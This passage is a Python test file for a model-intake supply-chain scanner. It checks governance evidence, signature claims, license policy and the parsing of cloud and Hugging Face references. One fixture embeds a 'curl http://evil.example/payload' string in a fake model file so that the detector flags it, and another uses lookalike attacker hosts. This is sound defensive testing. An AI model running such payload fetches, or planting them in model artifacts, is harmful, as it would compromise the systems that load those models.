    assert result["model_intake"]["checks"]["malware_scan"] is False


def test_model_intake_strict_governance_rejects_presence_only_evidence(tmp_path):
    artifact = tmp_path / "model.onnx"
    artifact.write_bytes(b"onnx bytes")
    expected_sha = hashlib.sha256(artifact.read_bytes()).hexdigest()

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "expected_sha256": expected_sha,
                "require_signature": False,
                "require_deployment_approval": True,
                "strict_governance": True,
                "deployment_approved": True,
                "metadata_json": {
                    "source_repo": "https://github.com/example/model",
                    "license": "apache-2.0",
                    "sbom": {"components": []},
                    "malware_scan_result": {"status": "clean", "scanner": "yara", "timestamp": "2020-01-01T00:00:00Z"},
                    "security_evals": {"status": "passed", "suite_id": "redteam-v1"},
                    "deployment_restrictions": ["production"],
                    "monitoring_plan": "model-monitoring-v1",
                },
            }),
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:invalid_sbom_evidence" in finding_ids
    assert "model_intake:invalid_malware_scan_evidence" in finding_ids
    assert "model_intake:invalid_security_eval_evidence" in finding_ids
    assert "model_intake:incomplete_deployment_approval" in finding_ids
    assert result["model_intake"]["checks"]["sbom_dependencies"] is False
    assert result["model_intake"]["checks"]["malware_scan"] is False
    assert result["model_intake"]["checks"]["security_evals"] is False
    assert result["model_intake"]["checks"]["approval_evidence"] is False


def test_model_intake_strict_governance_accepts_structured_evidence(tmp_path):
    artifact = tmp_path / "model.onnx"
    artifact.write_bytes(b"onnx bytes")
    expected_sha = hashlib.sha256(artifact.read_bytes()).hexdigest()
    now = datetime.now(timezone.utc).isoformat()

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "expected_sha256": expected_sha,
                "require_signature": False,
                "require_deployment_approval": True,
                "strict_governance": True,
                "deployment_approved": True,
                "model_card_url": "https://example.test/model-card",
                "metadata_json": {
                    "source_repo": "https://github.com/example/model",
                    "license": "apache-2.0",
                    "base_model": "example/base",
                    "training_data_ref": "dataset:v1",
                    "dataset_digest": "sha256:" + "d" * 64,
                    "fine_tuning_job": "train-job-1",
                    "poisoning_evals": {"status": "passed", "suite_id": "poisoning-v1"},
                    "sbom": {
                        "bomFormat": "CycloneDX",
                        "components": [{"name": "runtime", "purl": "pkg:pypi/runtime@1.0.0"}],
                    },
                    "malware_scan_result": {
                        "status": "clean",
                        "scanner": "yara",
                        "engine_version": "4.5.0",
                        "timestamp": now,
                        "artifact_digest": expected_sha,
                    },
                    "security_evals": {
                        "status": "passed",
                        "suite_id": "redteam-v1",
                        "date": now,
                        "target_sha256": expected_sha,
                        "thresholds": {"prompt_leakage": 0},
                    },
                    "deployment_restrictions": ["production"],
                    "monitoring_plan": "model-monitoring-v1",
                    "approved_by": "security",
                    "approved_at": now,
                    "policy_version": "prod-ai-v1",
                    "environment": "production",
                },
            }),
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:invalid_sbom_evidence" not in finding_ids
    assert "model_intake:invalid_malware_scan_evidence" not in finding_ids
    assert "model_intake:invalid_security_eval_evidence" not in finding_ids
    assert "model_intake:incomplete_deployment_approval" not in finding_ids
    assert result["model_intake"]["checks"]["sbom_dependencies"] is True
    assert result["model_intake"]["checks"]["malware_scan"] is True
    assert result["model_intake"]["checks"]["security_evals"] is True
    assert result["model_intake"]["checks"]["approval_evidence"] is True
    assert result["model_intake"]["checks"]["dataset_lineage"] is True
    assert result["model_intake"]["checks"]["dataset_digest"] is True
    assert result["model_intake"]["checks"]["base_model_lineage"] is True
    assert result["model_intake"]["checks"]["poisoning_evals"] is True


def test_model_intake_can_require_signature_verification(tmp_path):
    artifact = tmp_path / "model.onnx"
    artifact.write_bytes(b"onnx bytes")
    expected_sha = hashlib.sha256(artifact.read_bytes()).hexdigest()

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "expected_sha256": expected_sha,
                "signature_url": "https://example.test/model.onnx.sig",
                "model_card_url": "https://example.test/model-card",
                "deployment_approved": True,
                "require_signature_verification": True,
                "metadata_json": {
                    "source_repo": "https://github.com/example/model",
                    "commit_sha": "abc123",
                    "training_data_ref": "dataset:v1",
                    "license": "apache-2.0",
                    "sbom": {"components": []},
                    "malware_scan_result": {"status": "clean"},
                    "security_evals": {"status": "passed"},
                    "deployment_restrictions": ["staging"],
                    "monitoring_plan": "model-monitoring-v1",
                },
            }),
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:signature_not_verified" in finding_ids
    assert result["model_intake"]["checks"]["signature_verification"] is False


def test_model_intake_treats_metadata_signature_claim_as_unverified(tmp_path):
    artifact = tmp_path / "model.onnx"
    artifact.write_bytes(b"onnx bytes")
    expected_sha = hashlib.sha256(artifact.read_bytes()).hexdigest()

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "expected_sha256": expected_sha,
                "signature_url": "https://example.test/model.onnx.sig",
                "model_card_url": "https://example.test/model-card",
                "deployment_approved": True,
                "require_signature_verification": True,
                "metadata_json": {
                    "source_repo": "https://github.com/example/model",
                    "sigstore_verified": True,
                    "license": "apache-2.0",
                    "sbom": {"components": []},
                    "malware_scan_result": {"status": "clean"},
                    "security_evals": {"status": "passed"},
                    "deployment_restrictions": ["staging"],
                    "monitoring_plan": "model-monitoring-v1",
                },
            }),
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:signature_not_verified" in finding_ids
    assert result["model_intake"]["summary"]["signature_verification_status"] == "claimed_verified"
    assert result["model_intake"]["summary"]["signature_claimed_verified"] is True
    assert result["model_intake"]["summary"]["signature_cryptographically_verified"] is False


def test_model_intake_flags_restricted_license_and_loader_markers(tmp_path):
    artifact = tmp_path / "model.bin"
    artifact.write_bytes(b"model bytes with subprocess and curl http://evil.example/payload")

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "require_deployment_approval": False,
                "metadata_json": {
                    "source_repo": "https://github.com/example/model",
                    "license": "research only non-commercial",
                    "sbom": {"components": []},
                    "malware_scan_result": {"status": "clean"},
                    "security_evals": {"status": "passed"},
                    "deployment_restrictions": ["staging"],
                    "monitoring_plan": "model-monitoring-v1",
                },
            }),
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:restricted_license_policy" in finding_ids
    assert "model_intake:suspicious_loader_markers" in finding_ids
    assert result["model_intake"]["supply_chain"]["license_policy"]["status"] == "restricted"
    assert result["model_intake"]["checks"]["license_policy"] is False


def test_model_intake_parses_huggingface_refs():
    parsed = parse_huggingface_ref("https://huggingface.co/acme/ranker/blob/main/model.safetensors")

    assert parsed["repo_id"] == "acme/ranker"
    assert parsed["filename"] == "model.safetensors"
    assert parsed["revision"] == "main"
    assert parsed["resolve_url"] == "https://huggingface.co/acme/ranker/resolve/main/model.safetensors"

    parsed = parse_huggingface_ref("hf://acme/ranker@abc123/weights/model.onnx")
    assert parsed["repo_id"] == "acme/ranker"
    assert parsed["filename"] == "weights/model.onnx"
    assert parsed["revision"] == "abc123"


def test_model_intake_fetches_huggingface_resolve_url(monkeypatch):
    artifact_bytes = b"safe tensor bytes"
    expected_sha = hashlib.sha256(artifact_bytes).hexdigest()
    observed_urls = []
    observed_headers = []

    def fake_download_http(url, max_bytes, timeout_seconds, headers=None):
        observed_urls.append(url)
        observed_headers.append(headers or {})
        return artifact_bytes, {
            "source": "http",
            "status": 206,
            "bytes_observed": len(artifact_bytes),
            "truncated": False,
        }

    monkeypatch.setattr(model_intake, "_download_http", fake_download_http)

    result = asyncio.run(
        run_model_intake_scan(
            "hf://acme/ranker@abc123/model.safetensors",
            {
                "expected_sha256": expected_sha,
                "signature_url": "https://example.test/model.sig",
                "model_card_url": "https://huggingface.co/acme/ranker",
                "deployment_approved": True,
                "metadata_json": {
                    "source_repo": "https://huggingface.co/acme/ranker",
                    "hf_token": "hf_test_token",
                    "license": "apache-2.0",
                    "sbom": {"components": []},
                    "malware_scan_result": {"status": "clean"},
                    "security_evals": {"status": "passed"},
                    "deployment_restrictions": ["staging"],
                    "monitoring_plan": "model-monitoring-v1",
                },
            },
        )
    )

    assert observed_urls == ["https://huggingface.co/acme/ranker/resolve/abc123/model.safetensors"]
    assert observed_headers == [{"Authorization": "Bearer hf_test_token"}]
    assert result["model_intake"]["summary"]["source_kind"] == "huggingface"
    assert result["model_intake"]["artifact"]["fetch"]["source"] == "huggingface"
    assert result["model_intake"]["artifact"]["fetch"]["authenticated"] is True
    assert result["model_intake"]["artifact"]["fetch"]["auth_source"] == "metadata"
    assert result["model_intake"]["metadata"]["hf_token"] == "***"
    assert not any(finding["id"] == "model_intake:artifact_fetch_failed" for finding in result["findings"])


def test_model_intake_normalizes_cloud_and_registry_refs():
    s3_ref = normalize_model_artifact_reference("s3://models-prod/releases/ranker/model.safetensors")
    assert s3_ref["kind"] == "s3"
    assert s3_ref["bucket"] == "models-prod"
    assert s3_ref["object_key"] == "releases/ranker/model.safetensors"
    assert s3_ref["format_posture"] == "safer_static_format"
    assert s3_ref["metadata"]["storage_provider"] == "s3"
    assert s3_ref["fetch_url"] == "https://models-prod.s3.amazonaws.com/releases/ranker/model.safetensors"
    assert s3_ref["warnings"]

    gcs_ref = normalize_model_artifact_reference("https://storage.googleapis.com/ml-bucket/releases/model.onnx", platform="gcs")
    assert gcs_ref["kind"] == "gcs"
    assert gcs_ref["bucket"] == "ml-bucket"
    assert gcs_ref["object_key"] == "releases/model.onnx"
    assert gcs_ref["fetchable"] is True
    assert gcs_ref["warnings"] == []

    azure_ref = normalize_model_artifact_reference("azure://acct/models/release/model.gguf")
    assert azure_ref["kind"] == "azure_blob"
    assert azure_ref["account"] == "acct"
    assert azure_ref["container"] == "models"
    assert azure_ref["blob_path"] == "release/model.gguf"
    assert azure_ref["fetch_url"] == "https://acct.blob.core.windows.net/models/release/model.gguf"

    oci_ref = normalize_model_artifact_reference("oci://registry.example.com/ml/ranker:latest")
    assert oci_ref["kind"] == "oci"
    assert oci_ref["registry"] == "registry.example.com"
    assert oci_ref["repository"] == "ml/ranker"
    assert oci_ref["tag"] == "latest"
    assert any("digest" in warning for warning in oci_ref["warnings"])

    mlflow_ref = normalize_model_artifact_reference("models:/fraud-detector/Production", platform="mlflow")
    assert mlflow_ref["kind"] == "mlflow"
    assert mlflow_ref["model_name"] == "fraud-detector"
    assert mlflow_ref["stage"] == "Production"


def test_model_intake_auto_detects_common_provider_urls():
    s3_ref = normalize_model_artifact_reference("https://models-prod.s3.amazonaws.com/releases/model.safetensors")
    assert s3_ref["kind"] == "s3"
    assert s3_ref["bucket"] == "models-prod"
    assert s3_ref["fetch_url"] == "https://models-prod.s3.amazonaws.com/releases/model.safetensors"

    gcs_ref = normalize_model_artifact_reference("https://storage.googleapis.com/ml-bucket/releases/model.onnx")
    assert gcs_ref["kind"] == "gcs"
    assert gcs_ref["bucket"] == "ml-bucket"
    assert gcs_ref["object_key"] == "releases/model.onnx"

    azure_ref = normalize_model_artifact_reference("https://acct.blob.core.windows.net/models/release/model.gguf")
    assert azure_ref["kind"] == "azure_blob"
    assert azure_ref["account"] == "acct"
    assert azure_ref["container"] == "models"

    mlflow_ref = normalize_model_artifact_reference("runs:/abc123/model", platform="auto")
    assert mlflow_ref["kind"] == "mlflow"
    assert mlflow_ref["run_id"] == "abc123"
    assert mlflow_ref["path"] == "model"


def test_model_intake_rejects_provider_lookalike_hosts():
    s3_lookalike = normalize_model_artifact_reference(
        "https://models.s3.amazonaws.com.evil.test/releases/model.safetensors"
    )
    azure_lookalike = normalize_model_artifact_reference(
        "https://acct.blob.core.windows.net.evil.test/models/model.gguf"
    )

    assert s3_lookalike["kind"] == "https"
    assert azure_lookalike["kind"] == "https"


def test_model_intake_fetches_public_cloud_object_refs(monkeypatch):
    artifact_bytes = b"safe tensor bytes"
    expected_sha = hashlib.sha256(artifact_bytes).hexdigest()
    observed_urls = []

    def fake_download_http(url, max_bytes, timeout_seconds, headers=None):
        observed_urls.append(url)
        return artifact_bytes, {
            "source": "http",
            "status": 206,
            "bytes_observed": len(artifact_bytes),
            "truncated": False,
        }

    monkeypatch.setattr(model_intake, "_download_http", fake_download_http)

    base_options = {
        "expected_sha256": expected_sha,
        "signature_url": "https://example.test/model.sig",
        "model_card_url": "https://example.test/model-card",
        "deployment_approved": True,
        "metadata_json": {
            "source_repo": "https://example.test/repo",
            "license": "apache-2.0",
            "sbom": {"components": []},
            "malware_scan_result": {"status": "clean"},
            "security_evals": {"status": "passed"},
            "deployment_restrictions": ["staging"],
            "monitoring_plan": "model-monitoring-v1",
        },
    }

    result = asyncio.run(run_model_intake_scan("s3://models-prod/releases/model.safetensors", base_options))
    assert "https://models-prod.s3.amazonaws.com/releases/model.safetensors" in observed_urls
    assert "https://example.test/model-card" in observed_urls
    assert result["model_intake"]["model_card_fetch"]["content_sha256"] == expected_sha
    assert result["model_intake"]["model_card_fetch"]["content_retained"] is False
    assert result["model_intake"]["artifact"]["fetch"]["source"] == "s3"
    assert "model_intake:artifact_fetch_failed" not in {finding["id"] for finding in result["findings"]}

    result = asyncio.run(run_model_intake_scan("gs://ml-bucket/releases/model.onnx", base_options))
    assert "https://storage.googleapis.com/ml-bucket/releases/model.onnx" in observed_urls
    assert result["model_intake"]["artifact"]["fetch"]["source"] == "gcs"

    result = asyncio.run(run_model_intake_scan("azure://acct/models/release/model.gguf", base_options))
    assert "https://acct.blob.core.windows.net/models/release/model.gguf" in observed_urls
    assert result["model_intake"]["artifact"]["fetch"]["source"] == "azure_blob"
